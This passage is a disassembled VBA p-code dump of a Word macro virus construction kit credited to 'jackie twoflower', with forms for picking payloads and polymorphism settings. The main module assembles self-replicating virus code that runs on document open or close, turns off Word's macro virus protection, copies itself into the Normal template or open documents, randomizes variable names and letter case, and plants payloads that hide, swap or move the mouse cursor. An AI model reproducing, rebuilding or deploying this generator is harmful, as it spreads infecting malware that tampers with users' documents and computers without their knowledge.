' Line #70:
' Line #71:
' 	FuncDefn (Private Sub OptionButton2_Click())
' Line #72:
' 	Ld OptionButton2 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DocOp 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St DocOp 
' 	EndIf 
' Line #73:
' 	EndSub 
' Line #74:
' Line #75:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #76:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	ArgsLd LCase 0x0001 
' 	Ld Label1 
' 	MemSt Caption 
' Line #77:
' 	EndSub 
' Macros/VBA/frmPayload - 2705 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld frmPayload 
' 	ArgsMemCall Hide 0x0000 
' Line #3:
' 	Ld frmDatum 
' 	ArgsMemCall Show 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #7:
' 	Ld frmPayload 
' 	ArgsMemCall Hide 0x0000 
' Line #8:
' 	Ld frmMain 
' 	ArgsMemCall Show 0x0000 
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Private Sub OptionButton1_Click())
' Line #12:
' 	Ld OptionButton1 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitDI2 0x0000 
' 	St Payload 
' Line #14:
' 	LitVarSpecial (True)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	EndSub 
' Line #17:
' Line #18:
' 	FuncDefn (Private Sub OptionButton2_Click())
' Line #19:
' 	Ld OptionButton2 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	St Payload 
' Line #21:
' 	LitVarSpecial (True)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	EndSub 
' Line #24:
' Line #25:
' 	FuncDefn (Private Sub OptionButton3_Click())
' Line #26:
' 	Ld OptionButton3 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LitDI2 0x0002 
' 	St Payload 
' Line #28:
' 	LitVarSpecial (True)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndSub 
' Line #31:
' Line #32:
' 	FuncDefn (Private Sub OptionButton4_Click())
' Line #33:
' 	Ld OptionButton4 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0003 
' 	St Payload 
' Line #35:
' 	LitVarSpecial (True)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' 	FuncDefn (Private Sub OptionButton5_Click())
' Line #40:
' 	Ld OptionButton5 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #41:
' 	LitDI2 0x0004 
' 	St Payload 
' Line #42:
' 	LitVarSpecial (False)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndSub 
' Macros/VBA/frmPiE - 2239 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld frmPiE 
' 	ArgsMemCall Hide 0x0000 
' Line #3:
' 	Ld frmMain 
' 	ArgsMemCall Show 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub OptionButton1_Click())
' Line #7:
' 	LitDI2 0x0005 
' 	St PiEActivity 
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Private Sub OptionButton2_Click())
' Line #11:
' 	LitDI2 0x0004 
' 	St PiEActivity 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub OptionButton3_Click())
' Line #15:
' 	LitDI2 0x0003 
' 	St PiEActivity 
' Line #16:
' 	EndSub 
' Line #17:
' Line #18:
' 	FuncDefn (Private Sub OptionButton4_Click())
' Line #19:
' 	LitDI2 0x00AF 
' 	St PiESize 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Private Sub OptionButton5_Click())
' Line #23:
' 	LitDI2 0x00E1 
' 	St PiESize 
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' 	FuncDefn (Private Sub OptionButton6_Click())
' Line #27:
' 	LitDI2 0x007D 
' 	St PiESize 
' Line #28:
' 	EndSub 
' Line #29:
' Macros/VBA/frmStart - 1843 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld frmStart 
' 	ArgsMemCall Hide 0x0000 
' Line #3:
' 	Ld frmMain 
' 	ArgsMemCall Show 0x0000 
' Line #4:
' 	EndSub 
' Macros/VBA/jackie - 23753 bytes
' Line #0:
' Line #1:
' Line #2:
' 	Dim (Public) 
' 	VarDefn Monate (As Integer)
' 	VarDefn Tage (As Integer)
' 	VarDefn Payload (As Integer)
' Line #3:
' 	Dim (Public) 
' 	VarDefn PiEActivity (As Integer)
' 	VarDefn PiESize (As Integer)
' Line #4:
' 	Dim (Public) 
' 	VarDefn PiEPoly (As Boolean)
' 	VarDefn DocOp (As Boolean)
' 	VarDefn DocCl (As Boolean)
' Line #5:
' Line #6:
' Line #7:
' 	FuncDefn (Sub AutoOpen())
' Line #8:
' Line #9:
' 	LitVarSpecial (True)
' 	St DocOp 
' Line #10:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Monate 
' Line #11:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Tage 
' Line #12:
' 	LitDI2 0x0003 
' 	St PiEActivity 
' Line #13:
' 	LitDI2 0x00AF 
' 	St PiESize 
' Line #14:
' 	LitDI2 0x0004 
' 	St Payload 
' Line #15:
' Line #16:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #17:
' Line #18:
' 	Ld frmStart 
' 	ArgsMemCall Show 0x0000 
' Line #19:
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub CreateClass(ThaName As String))
' Line #23:
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' Line #26:
' Line #27:
' 	ArgsCall Read 0x0000 
' Line #28:
' Line #29:
' Line #30:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0019 
' 	VarDefn Variable (As String)
' Line #31:
' 	Dim 
' 	VarDefn VirusCode (As String)
' Line #32:
' 	Dim 
' 	VarDefn ThePath (As String)
' Line #33:
' 	Dim 
' 	VarDefn PiEChar (As String)
' Line #34:
' 	Dim 
' 	VarDefn OldLines (As Integer)
' Line #35:
' Line #36:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St OldLines 
' Line #37:
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0019 
' 	For 
' Line #39:
' Line #40:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld i 
' 	ArgsSt Variable 0x0001 
' Line #41:
' Line #42:
' 	StartForVariable 
' 	Next 
' Line #43:
' Line #44:
' 	Ld PiEPoly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	St PiEChar 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St PiEChar 
' 	EndIf 
' Line #45:
' Line #46:
' Line #47:
' 	QuoteRem 0x0000 0x0050 "            VirusCode = "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr"
' Line #48:
' 	QuoteRem 0x0000 0x0050 "VirusCode = VirusCode & "Rem          Class Macro Kit v1.0    " & PiEChar & vbCr"
' Line #49:
' 	QuoteRem 0x0000 0x0050 "VirusCode = VirusCode & "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr"
' Line #50:
' 	QuoteRem 0x0000 0x0057 "VirusCode = VirusCode & "Rem          Class." & ThaName & "          " & PiEChar & vbCr"
' Line #51:
' 	QuoteRem 0x0000 0x0050 "VirusCode = VirusCode & "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr"
' Line #52:
' 	QuoteRem 0x0000 0x0050 "VirusCode = VirusCode & "Rem           All code written by    " & PiEChar & vbCr"
' Line #53:
' 	QuoteRem 0x0000 0x0050 "VirusCode = VirusCode & "Rem             jackie twoflower     " & PiEChar & vbCr"
' Line #54:
' 	QuoteRem 0x0000 0x0050 "VirusCode = VirusCode & "Rem         [LineZer0] & [Metaphase] " & PiEChar & vbCr"
' Line #55:
' 	QuoteRem 0x0000 0x0050 "VirusCode = VirusCode & "Rem        -=-=-=-=-=-=-=-=-=-=-=-=- " & PiEChar & vbCr"
' Line #56:
' Line #57:
' 	LitStr 0x0033 "Rem Do you see what I see? Do you hear what I hear?"
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #58:
' 	Ld VirusCode 
' 	LitStr 0x001C "Rem Do you feel what I feel?"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #59:
' 	Ld VirusCode 
' 	LitStr 0x0016 "Rem Do you ever cared?"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #60:
' 	Ld VirusCode 
' 	LitStr 0x0030 "Rem                           -jackie twoflower-"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #61:
' Line #62:
' 	Ld Payload 
' 	SelectCase 
' Line #63:
' Line #64:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #65:
' Line #66:
' 	Ld VirusCode 
' 	LitStr 0x0054 "Private Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #67:
' Line #68:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #69:
' Line #70:
' 	Ld VirusCode 
' 	LitStr 0x0053 "Private Declare Function SwapMouseButton Lib "USER32" (ByVal bSwap As Long) As Long"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #71:
' Line #72:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #73:
' Line #74:
' 	Ld VirusCode 
' 	LitStr 0x005D "Private Declare Function SetCursorPos Lib "USER32" (ByVal x As Long, ByVal y As Long) As Long"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #75:
' 	Ld VirusCode 
' 	LitStr 0x003F "Private Declare Function GetCursorPos Lib "USER32" (lpPoint As "
' 	Concat 
' 	LitDI2 0x0015 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0009 ") As Long"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #76:
' 	Ld VirusCode 
' 	LitStr 0x0047 "Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #77:
' 	Ld VirusCode 
' 	LitStr 0x000D "Private Type "
' 	Concat 
' 	LitDI2 0x0015 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #78:
' 	Ld VirusCode 
' 	LitDI2 0x0016 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0008 " As Long"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #79:
' 	Ld VirusCode 
' 	LitDI2 0x0017 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0008 " As Long"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #80:
' 	Ld VirusCode 
' 	LitStr 0x0008 "End Type"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #81:
' Line #82:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #83:
' Line #84:
' 	Ld VirusCode 
' 	LitStr 0x005D "Private Declare Function SetCursorPos Lib "USER32" (ByVal x As Long, ByVal y As Long) As Long"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #85:
' 	Ld VirusCode 
' 	LitStr 0x003F "Private Declare Function GetCursorPos Lib "USER32" (lpPoint As "
' 	Concat 
' 	LitDI2 0x0015 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0009 ") As Long"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #86:
' 	Ld VirusCode 
' 	LitStr 0x000D "Private Type "
' 	Concat 
' 	LitDI2 0x0015 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #87:
' 	Ld VirusCode 
' 	LitDI2 0x0016 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0008 " As Long"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #88:
' 	Ld VirusCode 
' 	LitDI2 0x0017 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0008 " As Long"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #89:
' 	Ld VirusCode 
' 	LitStr 0x0008 "End Type"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #90:
' Line #91:
' 	EndSelect 
' Line #92:
' Line #93:
' 	Ld DocOp 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld VirusCode 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' 	Else 
' 	BoSImplicit 
' 	Ld VirusCode 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' 	EndIf 
' Line #94:
' 	Ld VirusCode 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #95:
' 	Ld PiEPoly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld VirusCode 
' 	LitStr 0x0004 "Dim "
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	Ld PiESize 
' 	Concat 
' 	LitStr 0x0002 "):"
' 	Concat 
' 	St VirusCode 
' 	EndIf 
' Line #96:
' 	Ld VirusCode 
' 	LitStr 0x0049 "Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0)"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #97:
' 	Ld VirusCode 
' 	LitStr 0x0004 "Set "
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0021 " = MacroContainer.VBProject: Set "
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0010 ".VBComponents(1)"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #98:
' 	Ld VirusCode 
' 	LitStr 0x0004 "Set "
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0011 ".CodeModule: Set "
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0011 " = NormalTemplate"
' 	Concat 
' 	St VirusCode 
' Line #99:
' 	Ld PiEPoly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld VirusCode 
' 	LitStr 0x0002 ": "
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000A " = Chr(39)"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' 	Else 
' 	BoSImplicit 
' 	Ld VirusCode 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' 	EndIf 
' Line #100:
' 	Ld VirusCode 
' 	LitStr 0x0014 "If MacroContainer = "
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000A " Then Set "
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0011 " = ActiveDocument"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #101:
' Line #102:
' 	Ld PiEPoly 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #103:
' Line #104:
' 	Ld VirusCode 
' 	LitStr 0x0004 "Set "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0027 ".VBProject.VBComponents(1).CodeModule: "
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000F ".CountOfLines: "
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld PiESize 
' 	LitDI2 0x004B 
' 	Sub 
' 	Paren 
' 	Concat 
' 	LitStr 0x0010 " + Int(Rnd * 50)"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #105:
' 	Ld VirusCode 
' 	LitStr 0x0004 "For "
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0009 " =  1 To "
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0002 ": "
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0007 " = "": "
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000D " = Int(Rnd * "
' 	Concat 
' 	Ld PiEActivity 
' 	Concat 
' 	LitStr 0x0003 "): "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0009 " = InStr("
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0007 ".Lines("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0006 ", 1), "
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #106:
' 	Ld VirusCode 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0009 " = 1 And "
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " > "
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0006 " Then "
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #107:
' 	Ld VirusCode 
' 	LitDI2 0x000C 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000B " = 1: Goto "
' 	Concat 
' 	LitDI2 0x0018 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #108:
' 	Ld VirusCode 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #109:
' Line #110:
' 	Ld Payload 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #111:
' 	Ld VirusCode 
' 	LitDI2 0x000E 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000E " = UCase(Left("
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0007 ".Lines("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0007 ", 1), ("
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0007 " - 1)))"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #112:
' 	Ld VirusCode 
' 	LitStr 0x0004 "For "
' 	Concat 
' 	LitDI2 0x0019 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000C " = 1 To Len("
' 	Concat 
' 	LitDI2 0x000E 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 "): "
' 	Concat 
' 	LitDI2 0x000F 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0007 " = Mid("
' 	Concat 
' 	LitDI2 0x000E 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0019 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 ", 1)"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #113:
' 	Ld VirusCode 
' 	LitStr 0x0007 "If Asc("
' 	Concat 
' 	LitDI2 0x000F 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000F ") < 90 and Asc("
' 	Concat 
' 	LitDI2 0x000F 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000C ") > 65 Then "
' 	Concat 
' 	LitDI2 0x000F 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000B " = Chr(Asc("
' 	Concat 
' 	LitDI2 0x000F 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0016 ") + Int(Rnd * 2) * 32)"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #114:
' 	Ld VirusCode 
' 	LitDI2 0x0001 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") = "
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") & "
' 	Concat 
' 	LitDI2 0x000F 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0007 ": Next "
' 	Concat 
' 	LitDI2 0x0019 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #115:
' Line #116:
' 	ElseBlock 
' Line #117:
' Line #118:
' 	Ld VirusCode 
' 	LitDI2 0x000E 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0008 " = Left("
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0007 ".Lines("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0007 ", 1), ("
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0006 " - 1))"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #119:
' 	Ld VirusCode 
' 	LitDI2 0x0001 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") = "
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") & "
' 	Concat 
' 	LitDI2 0x000E 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #120:
' Line #121:
' 	EndIfBlock 
' Line #122:
' Line #123:
' 	Ld VirusCode 
' 	LitStr 0x0004 "For "
' 	Concat 
' 	LitDI2 0x0010 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0021 " = 1 To Int(75 - Int(Rnd * 20)): "
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0023 " & Chr(255 - Int(Rnd * 100)): Next "
' 	Concat 
' 	LitDI2 0x0010 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #124:
' 	Ld VirusCode 
' 	LitDI2 0x0001 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") = "
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") & "
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " & "
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #125:
